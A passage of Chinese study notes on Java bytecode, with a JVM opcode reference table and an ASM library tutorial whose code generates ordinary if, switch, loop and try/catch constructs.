static&#123;...&#125;，static int id = 1; | 方法名：&lt;clinit&gt;                       | 静态语句块/静态变量初始化 || public Test ()&#123;...&#125;               | 方法名：&lt;init&gt;，描述符()V            | 构造方法                      || void hello()&#123;...&#125;                 | ()V                                    | V表示void，无返回值       || Object login(String str) &#123;...&#125;    | (Ljava/lang/String;)Ljava/lang/Object; | 普通方法，返回Object类型      || void login(String str) &#123;...&#125;      | (Ljava/lang/String;)V                  | 普通方法，无返回值            |\n\nJava 虚拟机指令\n详情：https://docs.oracle.com/javase/specs/jvms/se15/html/jvms-6.html#jvms-6.5\n速查表：\n| 十六进制 | 助记符          | 指令说明                                                     || ———— | ———————- | —————————————————————————————— || 0x00     | nop             | 什么都不做                                                   || 0x01     | aconst_null     | 将null推送至栈顶                                             || 0x02     | iconst_m1       | 将int型-1推送至栈顶                                          || 0x03     | iconst_0        | 将int型0推送至栈顶                                           || 0x04     | iconst_1        | 将int型1推送至栈顶                                           || 0x05     | iconst_2        | 将int型2推送至栈顶                                           || 0x06     | iconst_3        | 将int型3推送至栈顶                                           || 0x07     | iconst_4        | 将int型4推送至栈顶                                           || 0x08     | iconst_5        | 将int型5推送至栈顶                                           || 0x09     | lconst_0        | 将long型0推送至栈顶                                          || 0x0a     | lconst_1        | 将long型1推送至栈顶                                          || 0x0b     | fconst_0        | 将float型0推送至栈顶                                         || 0x0c     | fconst_1        | 将float型1推送至栈顶                                         || 0x0d     | fconst_2        | 将float型2推送至栈顶                                         || 0x0e     | dconst_0        | 将double型0推送至栈顶                                        || 0x0f     | dconst_1        | 将double型1推送至栈顶                                        || 0x10     | bipush          | 将单字节的常量值(-128~127)推送至栈顶                         || 0x11     | sipush          | 将一个短整型常量值(-32768~32767)推送至栈顶                   || 0x12     | ldc             | 将int, float或String型常量值从常量池中推送至栈顶             || 0x13     | ldc_w           | 将int, float或String型常量值从常量池中推送至栈顶（宽索引）   || 0x14     | ldc2_w          | 将long或double型常量值从常量池中推送至栈顶（宽索引）         || 0x15     | iload           | 将指定的int型本地变量推送至栈顶                              || 0x16     | lload           | 将指定的long型本地变量推送至栈顶                             || 0x17     | fload           | 将指定的float型本地变量推送至栈顶                            || 0x18     | dload           | 将指定的double型本地变量推送至栈顶                           || 0x19     | aload           | 将指定的引用类型本地变量推送至栈顶                           || 0x1a     | iload_0         | 将第一个int型本地变量推送至栈顶                              || 0x1b     | iload_1         | 将第二个int型本地变量推送至栈顶                              || 0x1c     | iload_2         | 将第三个int型本地变量推送至栈顶                              || 0x1d     | iload_3         | 将第四个int型本地变量推送至栈顶                              || 0x1e     | lload_0         | 将第一个long型本地变量推送至栈顶                             || 0x1f     | lload_1         | 将第二个long型本地变量推送至栈顶                             || 0x20     | lload_2         | 将第三个long型本地变量推送至栈顶                             || 0x21     | lload_3         | 将第四个long型本地变量推送至栈顶                             || 0x22     | fload_0         | 将第一个float型本地变量推送至栈顶                            || 0x23     | fload_1         | 将第二个float型本地变量推送至栈顶                            || 0x24     | fload_2         | 将第三个float型本地变量推送至栈顶                            || 0x25     | fload_3         | 将第四个float型本地变量推送至栈顶                            || 0x26     | dload_0         | 将第一个double型本地变量推送至栈顶                           || 0x27     | dload_1         | 将第二个double型本地变量推送至栈顶                           || 0x28     | dload_2         | 将第三个double型本地变量推送至栈顶                           || 0x29     | dload_3         | 将第四个double型本地变量推送至栈顶                           || 0x2a     | aload_0         | 将第一个引用类型本地变量推送至栈顶                           || 0x2b     | aload_1         | 将第二个引用类型本地变量推送至栈顶                           || 0x2c     | aload_2         | 将第三个引用类型本地变量推送至栈顶                           || 0x2d     | aload_3         | 将第四个引用类型本地变量推送至栈顶                           || 0x2e     | iaload          | 将int型数组指定索引的值推送至栈顶                            || 0x2f     | laload          | 将long型数组指定索引的值推送至栈顶                           || 0x30     | faload          | 将float型数组指定索引的值推送至栈顶                          || 0x31     | daload          | 将double型数组指定索引的值推送至栈顶                         || 0x32     | aaload          | 将引用型数组指定索引的值推送至栈顶                           || 0x33     | baload          | 将boolean或byte型数组指定索引的值推送至栈顶                  || 0x34     | caload          | 将char型数组指定索引的值推送至栈顶                           || 0x35     | saload          | 将short型数组指定索引的值推送至栈顶                          || 0x36     | istore          | 将栈顶int型数值存入指定本地变量                              || 0x37     | lstore          | 将栈顶long型数值存入指定本地变量                             || 0x38     | fstore          | 将栈顶float型数值存入指定本地变量                            || 0x39     | dstore          | 将栈顶double型数值存入指定本地变量                           || 0x3a     | astore          | 将栈顶引用型数值存入指定本地变量                             || 0x3b     | istore_0        | 将栈顶int型数值存入第一个本地变量                            || 0x3c     | istore_1        | 将栈顶int型数值存入第二个本地变量                            || 0x3d     | istore_2        | 将栈顶int型数值存入第三个本地变量                            || 0x3e     | istore_3        | 将栈顶int型数值存入第四个本地变量                            || 0x3f     | lstore_0        | 将栈顶long型数值存入第一个本地变量                           || 0x40     | lstore_1        | 将栈顶long型数值存入第二个本地变量                           || 0x41     | lstore_2        | 将栈顶long型数值存入第三个本地变量                           || 0x42     | lstore_3        | 将栈顶long型数值存入第四个本地变量                           || 0x43     | fstore_0        | 将栈顶float型数值存入第一个本地变量                          || 0x44     | fstore_1        | 将栈顶float型数值存入第二个本地变量                          || 0x45     | fstore_2        | 将栈顶float型数值存入第三个本地变量                          || 0x46     | fstore_3        | 将栈顶float型数值存入第四个本地变量                          || 0x47     | dstore_0        | 将栈顶double型数值存入第一个本地变量                         || 0x48     | dstore_1        | 将栈顶double型数值存入第二个本地变量                         || 0x49     | dstore_2        | 将栈顶double型数值存入第三个本地变量                         || 0x4a     | dstore_3        | 将栈顶double型数值存入第四个本地变量                         || 0x4b     | astore_0        | 将栈顶引用型数值存入第一个本地变量                           || 0x4c     | astore_1        | 将栈顶引用型数值存入第二个本地变量                           || 0x4d     | astore_2        | 将栈顶引用型数值存入第三个本地变量                           || 0x4e     | astore_3        | 将栈顶引用型数值存入第四个本地变量                           || 0x4f     | iastore         | 将栈顶int型数值存入指定数组的指定索引位置                    || 0x50     | lastore         | 将栈顶long型数值存入指定数组的指定索引位置                   || 0x51     | fastore         | 将栈顶float型数值存入指定数组的指定索引位置                  || 0x52     | dastore         | 将栈顶double型数值存入指定数组的指定索引位置                 || 0x53     | aastore         | 将栈顶引用型数值存入指定数组的指定索引位置                   || 0x54     | bastore         | 将栈顶boolean或byte型数值存入指定数组的指定索引位置          || 0x55     | castore         | 将栈顶char型数值存入指定数组的指定索引位置                   || 0x56     | sastore         | 将栈顶short型数值存入指定数组的指定索引位置                  || 0x57     | pop             | 将栈顶数值弹出 (数值不能是long或double类型的)                || 0x58     | pop2            | 将栈顶的一个（long或double类型的)或两个数值弹出（其它）      || 0x59     | dup             | 复制栈顶数值并将复制值压入栈顶                               || 0x5a     | dup_x1          | 复制栈顶数值并将两个复制值压入栈顶                           || 0x5b     | dup_x2          | 复制栈顶数值并将三个（或两个）复制值压入栈顶                 || 0x5c     | dup2            | 复制栈顶一个（long或double类型的)或两个（其它）数值并将复制值压入栈顶 || 0x5d     | dup2_x1         | &lt;待补充&gt;                                                     || 0x5e     | dup2_x2         | &lt;待补充&gt;                                                     || 0x5f     | swap            | 将栈最顶端的两个数值互换(数值不能是long或double类型的)       || 0x60     | iadd            | 将栈顶两int型数值相加并将结果压入栈顶                        || 0x61     | ladd            | 将栈顶两long型数值相加并将结果压入栈顶                       || 0x62     | fadd            | 将栈顶两float型数值相加并将结果压入栈顶                      || 0x63     | dadd            | 将栈顶两double型数值相加并将结果压入栈顶                     || 0x64     | isub            | 将栈顶两int型数值相减并将结果压入栈顶                        || 0x65     | lsub            | 将栈顶两long型数值相减并将结果压入栈顶                       || 0x66     | fsub            | 将栈顶两float型数值相减并将结果压入栈顶                      || 0x67     | dsub            | 将栈顶两double型数值相减并将结果压入栈顶                     || 0x68     | imul            | 将栈顶两int型数值相乘并将结果压入栈顶                        || 0x69     | lmul            | 将栈顶两long型数值相乘并将结果压入栈顶                       || 0x6a     | fmul            | 将栈顶两float型数值相乘并将结果压入栈顶                      || 0x6b     | dmul            | 将栈顶两double型数值相乘并将结果压入栈顶                     || 0x6c     | idiv            | 将栈顶两int型数值相除并将结果压入栈顶                        || 0x6d     | ldiv            | 将栈顶两long型数值相除并将结果压入栈顶                       || 0x6e     | fdiv            | 将栈顶两float型数值相除并将结果压入栈顶                      || 0x6f     | ddiv            | 将栈顶两double型数值相除并将结果压入栈顶                     || 0x70     | irem            | 将栈顶两int型数值作取模运算并将结果压入栈顶                  || 0x71     | lrem            | 将栈顶两long型数值作取模运算并将结果压入栈顶                 || 0x72     | frem            | 将栈顶两float型数值作取模运算并将结果压入栈顶                || 0x73     | drem            | 将栈顶两double型数值作取模运算并将结果压入栈顶               || 0x74     | ineg            | 将栈顶int型数值取负并将结果压入栈顶                          || 0x75     | lneg            | 将栈顶long型数值取负并将结果压入栈顶                         || 0x76     | fneg            | 将栈顶float型数值取负并将结果压入栈顶                        || 0x77     | dneg            | 将栈顶double型数值取负并将结果压入栈顶                       || 0x78     | ishl            | 将int型数值左移位指定位数并将结果压入栈顶                    || 0x79     | lshl            | 将long型数值左移位指定位数并将结果压入栈顶                   || 0x7a     | ishr            | 将int型数值右（符号）移位指定位数并将结果压入栈顶            || 0x7b     | lshr            | 将long型数值右（符号）移位指定位数并将结果压入栈顶           || 0x7c     | iushr           | 将int型数值右（无符号）移位指定位数并将结果压入栈顶          || 0x7d     | lushr           | 将long型数值右（无符号）移位指定位数并将结果压入栈顶         || 0x7e     | iand            | 将栈顶两int型数值作“按位与”并将结果压入栈顶                  || 0x7f     | land            | 将栈顶两long型数值作“按位与”并将结果压入栈顶                 || 0x80     | ior             | 将栈顶两int型数值作“按位或”并将结果压入栈顶                  || 0x81     | lor             | 将栈顶两long型数值作“按位或”并将结果压入栈顶                 || 0x82     | ixor            | 将栈顶两int型数值作“按位异或”并将结果压入栈顶                || 0x83     | lxor            | 将栈顶两long型数值作“按位异或”并将结果压入栈顶               || 0x84     | iinc            | 将指定int型变量增加指定值（i++, i—, i+=2）                  || 0x85     | i2l             | 将栈顶int型数值强制转换成long型数值并将结果压入栈顶          || 0x86     | i2f             | 将栈顶int型数值强制转换成float型数值并将结果压入栈顶         || 0x87     | i2d             | 将栈顶int型数值强制转换成double型数值并将结果压入栈顶        || 0x88     | l2i             | 将栈顶long型数值强制转换成int型数值并将结果压入栈顶          || 0x89     | l2f             | 将栈顶long型数值强制转换成float型数值并将结果压入栈顶        || 0x8a     | l2d             | 将栈顶long型数值强制转换成double型数值并将结果压入栈顶       || 0x8b     | f2i             | 将栈顶float型数值强制转换成int型数值并将结果压入栈顶         || 0x8c     | f2l             | 将栈顶float型数值强制转换成long型数值并将结果压入栈顶        || 0x8d     | f2d             | 将栈顶float型数值强制转换成double型数值并将结果压入栈顶      || 0x8e     | d2i             | 将栈顶double型数值强制转换成int型数值并将结果压入栈顶        || 0x8f     | d2l             | 将栈顶double型数值强制转换成long型数值并将结果压入栈顶       || 0x90     | d2f             | 将栈顶double型数值强制转换成float型数值并将结果压入栈顶      || 0x91     | i2b             | 将栈顶int型数值强制转换成byte型数值并将结果压入栈顶          || 0x92     | i2c             | 将栈顶int型数值强制转换成char型数值并将结果压入栈顶          || 0x93     | i2s             | 将栈顶int型数值强制转换成short型数值并将结果压入栈顶         || 0x94     | lcmp            | 比较栈顶两long型数值大小，并将结果（1，0，-1）压入栈顶       || 0x95     | fcmpl           | 比较栈顶两float型数值大小，并将结果（1，0，-1）压入栈顶；当其中一个数值为NaN时，将-1压入栈顶 || 0x96     | fcmpg           | 比较栈顶两float型数值大小，并将结果（1，0，-1）压入栈顶；当其中一个数值为NaN时，将1压入栈顶 || 0x97     | dcmpl           | 比较栈顶两double型数值大小，并将结果（1，0，-1）压入栈顶；当其中一个数值为NaN时，将-1压入栈顶 || 0x98     | dcmpg           | 比较栈顶两double型数值大小，并将结果（1，0，-1）压入栈顶；当其中一个数值为NaN时，将1压入栈顶 || 0x99     | ifeq            | 当栈顶int型数值等于0时跳转                                   || 0x9a     | ifne            | 当栈顶int型数值不等于0时跳转                                 || 0x9b     | iflt            | 当栈顶int型数值小于0时跳转                                   || 0x9c     | ifge            | 当栈顶int型数值大于等于0时跳转                               || 0x9d     | ifgt            | 当栈顶int型数值大于0时跳转                                   || 0x9e     | ifle            | 当栈顶int型数值小于等于0时跳转                               || 0x9f     | if_icmpeq       | 比较栈顶两int型数值大小，当结果等于0时跳转                   || 0xa0     | if_icmpne       | 比较栈顶两int型数值大小，当结果不等于0时跳转                 || 0xa1     | if_icmplt       | 比较栈顶两int型数值大小，当结果小于0时跳转                   || 0xa2     | if_icmpge       | 比较栈顶两int型数值大小，当结果大于等于0时跳转               || 0xa3     | if_icmpgt       | 比较栈顶两int型数值大小，当结果大于0时跳转                   || 0xa4     | if_icmple       | 比较栈顶两int型数值大小，当结果小于等于0时跳转               || 0xa5     | if_acmpeq       | 比较栈顶两引用型数值，当结果相等时跳转                       || 0xa6     | if_acmpne       | 比较栈顶两引用型数值，当结果不相等时跳转                     || 0xa7     | goto            | 无条件跳转                                                   || 0xa8     | jsr             | 跳转至指定16位offset位置，并将jsr下一条指令地址压入栈顶      || 0xa9     | ret             | 返回至本地变量指定的index的指令位置（一般与jsr, jsr_w联合使用） || 0xaa     | tableswitch     | 用于switch条件跳转，case值连续（可变长度指令）               || 0xab     | lookupswitch    | 用于switch条件跳转，case值不连续（可变长度指令）             || 0xac     | ireturn         | 从当前方法返回int                                            || 0xad     | lreturn         | 从当前方法返回long                                           || 0xae     | freturn         | 从当前方法返回float                                          || 0xaf     | dreturn         | 从当前方法返回double                                         || 0xb0     | areturn         | 从当前方法返回对象引用                                       || 0xb1     | return          | 从当前方法返回void                                           || 0xb2     | getstatic       | 获取指定类的静态域，并将其值压入栈顶                         || 0xb3     | putstatic       | 为指定的类的静态域赋值                                       || 0xb4     | getfield        | 获取指定类的实例域，并将其值压入栈顶                         || 0xb5     | putfield        | 为指定的类的实例域赋值                                       || 0xb6     | invokevirtual   | 调用实例方法                                                 || 0xb7     | invokespecial   | 调用超类构造方法，实例初始化方法，私有方法                   || 0xb8     | invokestatic    | 调用静态方法                                                 || 0xb9     | invokeinterface | 调用接口方法                                                 || 0xba     | —              |                                                              || 0xbb     | new             | 创建一个对象，并将其引用值压入栈顶                           || 0xbc     | newarray        | 创建一个指定原始类型（如int, float, char…）的数组，并将其引用值压入栈顶 || 0xbd     | anewarray       | 创建一个引用型（如类，接口，数组）的数组，并将其引用值压入栈顶 || 0xbe     | arraylength     | 获得数组的长度值并压入栈顶                                   || 0xbf     | athrow          | 将栈顶的异常抛出                                             || 0xc0     | checkcast       | 检验类型转换，检验未通过将抛出ClassCastException             || 0xc1     | instanceof      | 检验对象是否是指定的类的实例，如果是将1压入栈顶，否则将0压入栈顶 || 0xc2     | monitorenter    | 获得对象的锁，用于同步方法或同步块                           || 0xc3     | monitorexit     | 释放对象的锁，用于同步方法或同步块                           || 0xc4     | wide            | &lt;待补充&gt;                                                     || 0xc5     | multianewarray  | 创建指定类型和指定维度的多维数组（执行该指令时，操作栈中必须包含各维度的长度值），并将其引用值压入栈顶 || 0xc6     | ifnull          | 为null时跳转                                                 || 0xc7     | ifnonnull       | 不为null时跳转                                               || 0xc8     | goto_w          | 无条件跳转（宽索引）                                         || 0xc9     | jsr_w           | 跳转至指定32位offset位置，并将jsr_w下一条指令地址压入栈顶    |\n\n\nTODO dup的作用？\n看下栈帧的变化，dup在里面的效果\n\n可以看到 new 完之后一定会接一个 invokespecial 指令，其会调用实例初始化方法:()V，注意这个方法是一个实例方法，所以需要从操作数栈顶弹出一个this引用，也就是说这一步会弹出一个之前入栈的对象地址。那么第二个我就可以直接拿来用了，因为他已经是实例化好的对象。如果我们不用，那编译器也会生成dup指令，在初始化方法调用完成后再从栈顶pop出来，如果要用的话需要我们手动从局部变量表里取\nJava 类字节码编辑 - ASM\nASM提供了三个基于ClassVisitor API的核心API，用于生成和转换类\n\nClassReader类用于解析class文件或二进制流；\nClassWriter类是ClassVisitor的子类，用于生成类二进制；\nClassVisitor是一个抽象类，自定义ClassVisitor重写visitXXX方法，可获取捕获ASM类结构访问的所有事件；\n\nClassReader和ClassVistor\n\nClassReader\n用于解析类字节码，提供三种创建方式：类名、类字节码数组、类输入流对象\n\n\nClassVisitor\n两个重要字段：api 指出了 ASM api 版本；cv 是一个 ClassVisitor 类型的数据，它的作用是将多个 ClassVisitor 串连起来\n\n其通常作为访问者模式中的访问者来根据顺序执行访问类结构中的不同部分，重点关注visit()、visitField()、visitMethod()和visitEnd()\n有一个signature参数需要注意，它与泛型密切先关，例子如下：无泛型的情况下设置为null即可\n\n常用的 Visitor 回调事件 注意参数！\n| 方法名              | 说明                                                         || —————————- | —————————————————————————————— || visit               | 访问class的头部信息时，version为class版本（编译版本），access为访问修饰符，name为类名称，signature为class的签名，可能是null，superName为超类名称，interfaces为接口的名称 || visitAnnotation     | 访问class的注解信息时，descriptor为签名描述信息，visible为是否运行时可见 || visitAttribute      | 访问该类的属性                                               || visitInnerClass     | 访问class中内部类的信息，而且这个内部类不一定是被访问类的成员（有可能是一段方法中的匿名内部类或者声明在一个方法中的类等等）。name为内部类的名称，outerName为内部类所在类的名称，innerName为内部类的名称 || visitOuterClass     | 访问该类的外部类，仅当类具有封闭类时，才必须调用此方法。owner为拥有该类的class名称，name为包含该类的方法的名称，如果该类未包含在其封闭类的方法中，则返回null，descriptor为签名描述信息 || visitEnd            | 结束访问class时调用                                      || visitField          | 访问class中字段的信息，返回一个FieldVisitor用于操作字段相关的信息，access为访问修饰符，name为类名称，signature为class的签名，可能是null，descriptor为描述信息 || visitMethod         | 访问class中方法的信息，返回一个MethodVisitor用于操作字段相关的信息，access为访问修饰符，name为方法名称，signature为方法的签名，可能是null，descriptor为描述信息，exceptions为异常 || visitModule         | 访问对应的模块                                               || visitTypeAnnotation | 访问类的签名的注解                                           || visitNestHost       | 访问类的nest host；(nest 指的一个共享私有成员变量的包名相同的class集合，nest中有一个host(主类)和多个members(成员类)，jdk11为了提供更大，更广泛的嵌套类型，并且为了补足访问控制检测不足，引进了两个新的class文件属性，nest host 和nest member,nest host中包含了一个nest members列表，用来确定其他静态nest members;nest member中包含了一个nest host属性用来确定它的nesthost;) || visitNestMember     | 访问嵌套类的nest member，只有host class被visited时才能调用该方法 |\n\n参数说明：\n\n\nvisitField (access, name, descriptor, signature, value)\nvisitMethod(access, name, descriptor, signature, exceptions)\n\naccess参数：表示当前字段或方法带有的访问标识（access flag）信息，例如ACC_PUBLIC、ACC_STATIC和ACC_FINAL等。\n\nname参数：表示当前字段或方法的名字。\ndescriptor参数：表示当前字段或方法的描述符。这些描述符，与我们平时使用的Java类型是有区别的。\nsignature参数：表示当前字段或方法是否带有泛型信息。换句话说，如果不带有泛型信息，提供一个null就可以了；如果带有泛型信息，就需要给它提供某一个具体的值。\nvalue参数：是visitField()方法的第5个参数。这个参数的取值，与当前字段是否为常量有关系。如果当前字段是一个常量，就需要给value参数提供某一个具体的值；如果当前字段不是常量，那么使用null就可以了。\nexceptions参数：是visitMethod()方法的第5个参数。这个参数的取值，与当前方法头（Method Header）中是否具有throws XxxException相关。\n\n\n\nFieldVisitor类\n通过 ClassVisitor类的 visitField方法返回\npublic FieldVisitor visitField(int access, String name, String descriptor, String signature, Object value);//示例&#123;fieldVisitor = classWriter.visitField(ACC_PUBLIC | ACC_STATIC, &quot;a&quot;, &quot;I&quot;, null, null);fieldVisitor.visitEnd();&#125;\n同样也支持一系列 visitxxx的回调\n这里的方法只需要关注一个visitEnd() 即可\n\nClassWriter 类\n构造函数中的参数\n\n使用该类生成一个 Class 文件，可以分成三个步骤：\n\n\n第一步，创建ClassWriter对象。\n第二步，调用ClassWriter对象的visitXxx()方法。\n第三步，调用ClassWriter对象的toByteArray()方法。\n\n\n\n\nMethodVisitor和AdviceAdapter\nMethodVisitor 同 ClassVisitor，重写MethodVisitor类方法可获取捕获到对应的visit事件\n顺序如下\n( visitParameter )* [ visitAnnotationDefault ]   ( visitAnnotation | visitAnnotableParameterCount | visitParameterAnnotation visitTypeAnnotation | visitAttribute )*   [ visitCode    ( visitFrame | visit&lt;i&gt;X&lt;/i&gt;Insn | visitLabel | visitInsnAnnotation | visitTryCatchBlock | visitTryCatchAnnotation | visitLocalVariable | visitLocalVariableAnnotation | visitLineNumber )*    visitMaxs   ] visitEnd\nAdviceAdapter 的父类是 GeneratorAdapter和LocalVariablesSorter\nAdviceAdapter类实现了一些非常有价值的方法，如：onMethodEnter（方法进入时回调方法）、onMethodExit（方法退出时回调方法），如果我们自己实现很容易掉进坑里面，因为这两个方法都是根据条件推算出来的。比如我们如果在构造方法的第一行直接插入了我们自己的字节码就可能会发现程序一运行就会崩溃，因为Java语法中限制我们第一行代码必须是super(xxx)。\n使用AdviceAdapter可以直接调用newLocal(type)计算出本地变量存储的位置，为我们省去了许多不必要的麻烦\nGeneratorAdapter封装了一些栈指令操作的方法，如loadArgArray方法可以直接获取方法所有参数数组、invokeStatic方法可以直接调用类方法、push、storeLocal方法可压入各种类型的对象等。\nMethodVisitor 常用API\n\nvisitFieldInsn\n\nVisits a field instruction. A field instruction is an instruction that loads or stores the value of a field of an object\n\n支持 GETSTATIC, PUTSTATIC, GETFIELD or PUTFIELD操作\n\nvisitFrame\n\nVisits the current state of the local variables and operand stack elements\n\n参数就是局部变量表和操作数栈的内容\n\nvisitIincInsn\n处理 IINC指令：将指定int型变量增加指定值\n\nvisitVarInsn\n\nVisits a local variable instruction. A local variable instruction is an instruction that loads or stores the value of a local variable\n\n就是取局部变量变的值放入操作数栈\n\nvisitMethodInsn\n\nvisits a method instruction. A method instruction is an instruction that invokes a method\n\n支持INVOKEVIRTUAL, INVOKESPECIAL, INVOKESTATIC or INVOKEINTERFACE。也就是调用某个方法\n\nvisitInsn \n\nVisits a zero operand instruction\n\n参数就是操作码op\n\nvisitTypeInsn\n\nVisits a type instruction. A type instruction is an instruction that takes the internal name of a class as parameter\n\n将一个类的全限定名作为参数然后new一个对象压入操作数栈中\n\nvisitCode/End\n访问的开始/结束\n\nvisitLdcInsn\n\nthe constant to be loaded on the stack\n\n访问常量池索引\n在&lt;init&gt;初始化函数的构造中，this变量也需要经过一个初始化的操作，其位于局部变量表索引为0的位置\n\n这里说明一下构造函数方法的创建，就以最基本的空构造函数为例，由于前面说了刚开始的this变量是处于未初始化的状态，因此需要进行初始化，那么用什么方法呢。这里实际就是用的父类的构造函数，对于一般的对象，就调用父类 Object 类的构造函数即可\n// &lt;init&gt;public A() &#123;\tsuper();&#125;// asmMethodVisitor mv1 = cw.visitMethod(ACC_PUBLIC, &quot;&lt;init&gt;&quot;, &quot;()V&quot;, null, null);            mv1.visitCode();            mv1.visitVarInsn(ALOAD, 0);            mv1.visitMethodInsn(INVOKESPECIAL, &quot;java/lang/Object&quot;, &quot;&lt;init&gt;&quot;, &quot;()V&quot;, false);            mv1.visitInsn(RETURN);            mv1.visitMaxs(1, 1);            mv1.visitEnd();\n\n\nLabel类\n\n\nA position in the bytecode of a method.\nLabels are used for jump, goto, and switch instructions, and for try catch blocks.\nA label designates the instruction that is just after. Note however that there can be other elements between a label and the instruction it designates (such as other labels, stack map frames, line numbers, etc.).\n\n\nLabel类中存在一个属性 bytecodeOffset 它用于计算相对偏移量。由于指令是索引值位置可变，我们想要固定一个跳转位置的话则需要 Label 的参与，当asm转换成byte[] 时，将通过Label与待跳转位置相减来计算出相对偏移量。\n\n如果要添加一个跳转位置的话，调用 MethodVisitor.visitLabel(Label)\n可以用于实现选择、循环、try-catch语句\n生成if语句\nif (value == 0) &#123;  System.out.println(&quot;0&quot;);&#125;else &#123;  System.out.println(&quot;not 0&quot;);&#125;\n&#123;     methodVisitor = classWriter.visitMethod(ACC_PUBLIC, &quot;test&quot;, &quot;(I)V&quot;, null, null);     methodVisitor.visitCode();     methodVisitor.visitVarInsn(ILOAD, 1);     Label label0 = new Label();     methodVisitor.visitJumpInsn(IFNE, label0);     methodVisitor.visitFieldInsn(GETSTATIC, &quot;java/lang/System&quot;, &quot;out&quot;, &quot;Ljava/io/PrintStream;&quot;);     methodVisitor.visitLdcInsn(&quot;0&quot;);     methodVisitor.visitMethodInsn(INVOKEVIRTUAL, &quot;java/io/PrintStream&quot;, &quot;println&quot;, &quot;(Ljava/lang/String;)V&quot;, false);     Label label1 = new Label();     methodVisitor.visitJumpInsn(GOTO, label1);       methodVisitor.visitLabel(label0);     methodVisitor.visitFieldInsn(GETSTATIC, &quot;java/lang/System&quot;, &quot;out&quot;, &quot;Ljava/io/PrintStream;&quot;);     methodVisitor.visitLdcInsn(&quot;not 0&quot;);     methodVisitor.visitMethodInsn(INVOKEVIRTUAL, &quot;java/io/PrintStream&quot;, &quot;println&quot;, &quot;(Ljava/lang/String;)V&quot;, false);     methodVisitor.visitLabel(label1);     methodVisitor.visitInsn(RETURN);     methodVisitor.visitMaxs(2, 2);     methodVisitor.visitEnd(); &#125;\n生成switch语句\nswitch (val) &#123;  case 1:    System.out.println(&quot;1&quot;);    break;  case 2:    System.out.println(&quot;2&quot;);    break;  case 3:    System.out.println(&quot;3&quot;);    break;  case 9:    System.out.println(&quot;9&quot;);    break;  default:    System.out.println(&quot;unknown&quot;);&#125;\n&#123;            methodVisitor = classWriter.visitMethod(ACC_PUBLIC, &quot;test&quot;, &quot;(I)V&quot;, null, null);            methodVisitor.visitCode();            methodVisitor.visitVarInsn(ILOAD, 1);            Label label0 = new Label();            Label label1 = new Label();            Label label2 = new Label();            Label label3 = new Label();            Label label4 = new Label();            methodVisitor.visitTableSwitchInsn(1, 9, label3, new Label[] &#123; label0, label1, label2, label3, label3, label3, label3, label3, label4 &#125;);            methodVisitor.visitLabel(label0);            methodVisitor.visitFieldInsn(GETSTATIC, &quot;java/lang/System&quot;, &quot;out&quot;, &quot;Ljava/io/PrintStream;&quot;);            methodVisitor.visitLdcInsn(&quot;1&quot;);            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, &quot;java/io/PrintStream&quot;, &quot;println&quot;, &quot;(Ljava/lang/String;)V&quot;, false);            Label label5 = new Label();            methodVisitor.visitJumpInsn(GOTO, label5);            methodVisitor.visitLabel(label1);            methodVisitor.visitFieldInsn(GETSTATIC, &quot;java/lang/System&quot;, &quot;out&quot;, &quot;Ljava/io/PrintStream;&quot;);            methodVisitor.visitLdcInsn(&quot;2&quot;);            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, &quot;java/io/PrintStream&quot;, &quot;println&quot;, &quot;(Ljava/lang/String;)V&quot;, false);            methodVisitor.visitJumpInsn(GOTO, label5);            methodVisitor.visitLabel(label2);            methodVisitor.visitFieldInsn(GETSTATIC, &quot;java/lang/System&quot;, &quot;out&quot;, &quot;Ljava/io/PrintStream;&quot;);            methodVisitor.visitLdcInsn(&quot;3&quot;);            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, &quot;java/io/PrintStream&quot;, &quot;println&quot;, &quot;(Ljava/lang/String;)V&quot;, false);            methodVisitor.visitJumpInsn(GOTO, label5);            methodVisitor.visitLabel(label4);            methodVisitor.visitFieldInsn(GETSTATIC, &quot;java/lang/System&quot;, &quot;out&quot;, &quot;Ljava/io/PrintStream;&quot;);            methodVisitor.visitLdcInsn(&quot;9&quot;);            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, &quot;java/io/PrintStream&quot;, &quot;println&quot;, &quot;(Ljava/lang/String;)V&quot;, false);            methodVisitor.visitJumpInsn(GOTO, label5);            methodVisitor.visitLabel(label3);            methodVisitor.visitFieldInsn(GETSTATIC, &quot;java/lang/System&quot;, &quot;out&quot;, &quot;Ljava/io/PrintStream;&quot;);            methodVisitor.visitLdcInsn(&quot;unknown&quot;);            methodVisitor.visitMethodInsn(INVOKEVIRTUAL, &quot;java/io/PrintStream&quot;, &quot;println&quot;, &quot;(Ljava/lang/String;)V&quot;, false);            methodVisitor.visitLabel(label5);            methodVisitor.visitInsn(RETURN);            methodVisitor.visitMaxs(2, 2);            methodVisitor.visitEnd();&#125;\n生成for语句\nfor (int i = 0; i &lt; 10; i++) &#123;    System.out.println(i);&#125;\n&#123;  methodVisitor = classWriter.visitMethod(ACC_PUBLIC, &quot;test&quot;, &quot;()V&quot;, null, null);  methodVisitor.visitCode();  methodVisitor.visitInsn(ICONST_0);  methodVisitor.visitVarInsn(ISTORE, 1);    Label label0 = new Label();  methodVisitor.visitLabel(label0);  methodVisitor.visitVarInsn(ILOAD, 1);  methodVisitor.visitIntInsn(BIPUSH, 10);    Label label1 = new Label();  methodVisitor.visitJumpInsn(IF_ICMPGE, label1);  methodVisitor.visitFieldInsn(GETSTATIC, &quot;java/lang/System&quot;, &quot;out&quot;, &quot;Ljava/io/PrintStream;&quot;);  methodVisitor.visitVarInsn(ILOAD, 1);  methodVisitor.visitMethodInsn(INVOKEVIRTUAL, &quot;java/io/PrintStream&quot;, &quot;println&quot;, &quot;(I)V&quot;, false);  methodVisitor.visitIincInsn(1, 1);  methodVisitor.visitJumpInsn(GOTO, label0);  methodVisitor.visitLabel(label1);  methodVisitor.visitInsn(RETURN);  methodVisitor.visitMaxs(2, 2);  methodVisitor.visitEnd();&#125;\n生成try catch语句\ntry &#123;  System.out.println(&quot;try&quot;);&#125; catch (Exception e) &#123;  System.out.println(&quot;catch&quot;);&#125;\n&#123;            methodVisitor = classWriter.visitMethod(ACC_PUBLIC, &quot;test&quot;, &quot;(I)V&quot;, null, null);            methodVisitor.visitCode();            Label label0 = new Label();            Label label1 = new Label();            Label label2 = new Label();            methodVisitor.visitTryCatchBlock(label0, label1, label2, &quot;java/lang/Exception&quot;);            methodVisitor.visitLabel(label0);            methodVisitor.visitFieldInsn(GETSTATIC, &quot;java/lang/System&quot;, &quot;out&quot;, 